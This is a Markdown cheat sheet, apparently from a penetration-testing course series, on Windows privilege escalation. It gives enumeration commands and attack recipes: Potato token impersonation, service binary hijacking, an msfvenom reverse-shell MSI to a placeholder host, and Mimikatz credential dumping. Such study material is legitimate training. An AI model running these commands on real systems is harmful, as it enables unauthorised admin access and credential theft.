# 11 — Windows Privilege Escalation

## Step 1: Automated Enum First

```powershell
# WinPEAS
.\winPEASx64.exe

# PowerUp
powershell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt (fast, focused, C# - great in AV-restricted envs since it's compiled)
.\Seatbelt.exe -group=all
```
**Better than HTB's winPEAS-only teaching:** run **Seatbelt** alongside winPEAS — it's faster, quieter, and specifically strong at AD-context checks (Kerberos tickets, logon sessions, AV product detection) that winPEAS sometimes buries in noise.

## Manual Checklist

```powershell
whoami /priv                          # check for SeImpersonate, SeBackup, SeDebug, SeTakeOwnership etc.
whoami /groups
systeminfo                            # OS build for kernel exploit search
wmic qfe list                         # patches installed (compare to missing KBs)
net user
net localgroup administrators
schtasks /query /fo LIST /v           # scheduled tasks
Get-WmiObject -Class win32_service | Select Name,StartName,PathName   # services + who runs them
icacls "C:\Program Files\vulnerable\service.exe"    # writable service binary?
reg query HKLM\SYSTEM\CurrentControlSet\Services\<svc>
Get-ChildItem -Path C:\ -Include *.config,*.xml,*.txt -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"
```

## Common Wins

### Token Impersonation (SeImpersonatePrivilege) — Potato Family
```powershell
whoami /priv     # look for SeImpersonatePrivilege = enabled
# Use PrintSpoofer (modern, reliable) or JuicyPotatoNG (if PrintSpoofer fails)
.\PrintSpoofer64.exe -i -c cmd
.\JuicyPotatoNG.exe -t * -p cmd.exe -a "" -l 9999
```
**Better than HTB's teaching of the old JuicyPotato:** original JuicyPotato is patched on modern Windows. Use **PrintSpoofer** first (works on Server 2016-2022 with SeImpersonate), fall back to **GodPotato** or **JuicyPotatoNG** if it fails.

### Unquoted Service Path
```powershell
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows"
# If path is: C:\Program Files\My App\service.exe (unquoted, has spaces)
# and you can write to C:\Program Files\ or C:\, drop:
copy malicious.exe "C:\Program Files\My.exe"
sc stop <svc> ; sc start <svc>
```

### Weak Service Permissions
```powershell
accesschk64.exe -uwcqv "Authenticated Users" *    # services users can reconfigure
sc config <svc> binpath= "C:\temp\shell.exe"
sc stop <svc> ; sc start <svc>
```

### AlwaysInstallElevated
```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
# both set to 1 -> 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=PORT -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi
```

### Saved Credentials / Registry Autologon
```powershell
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
# Mimikatz for cached creds/tickets
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

### DLL Hijacking
```powershell
# find missing DLL via Process Monitor or PowerUp's Find-ProcessDLLHijack
```

### Kernel Exploits (last resort)
```powershell
# Match systeminfo output against Watson or windows-exploit-suggester.py
python2 windows-exploit-suggester.py --update
python2 windows-exploit-suggester.py -d <db>.xls -i systeminfo.txt
.\Watson.exe
```

## Quick Reference — Tools In This File

| Task | HTB-taught | Faster/better alternative |
|---|---|---|
| Auto enum | winPEAS | winPEAS + `Seatbelt` together |
| Token impersonation | JuicyPotato | `PrintSpoofer` / `GodPotato` (work on current Windows) |
| Kernel exploit match | manual | `Watson` (checks live against known missing patches) |
| Service perms audit | manual icacls | `accesschk64.exe -uwcqv` for bulk view |

Next: `12-active-directory-enum.md`
